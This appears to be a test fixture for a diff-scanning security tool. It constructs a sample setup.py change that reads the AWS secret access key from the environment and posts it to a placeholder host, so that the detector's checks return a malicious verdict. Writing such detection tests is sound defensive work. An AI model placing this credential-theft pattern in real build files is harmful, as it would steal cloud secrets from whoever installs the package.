"""A chain every gate check passes (spec F §3.3), for tests that need a malicious verdict to stand."""
from pydiffwatch.models import FileDiff, Hunk

SOURCE = "data = os.environ['AWS_SECRET_ACCESS_KEY']"
SINK = "requests.post('https://collect.invalid/c', data=data)"
TEXT = f"import os\nimport requests\n{SOURCE}\n{SINK}\n"
FILE = FileDiff("setup.py", "modified", [Hunk((2, 2), (2, 4), [SOURCE, SINK], [])], TEXT)
JSON_FIELDS = {"runs_when": "build", "source_kind": "secret-read", "sink_kind": "send",
               "chain_source": SOURCE, "chain_sink": SINK}
FIELDS = dict(JSON_FIELDS)
SHOWN = {"setup.py": {"cls": "build", "lines": {3: SOURCE, 4: SINK}, "scopes": {3: "module", 4: "module"}}}
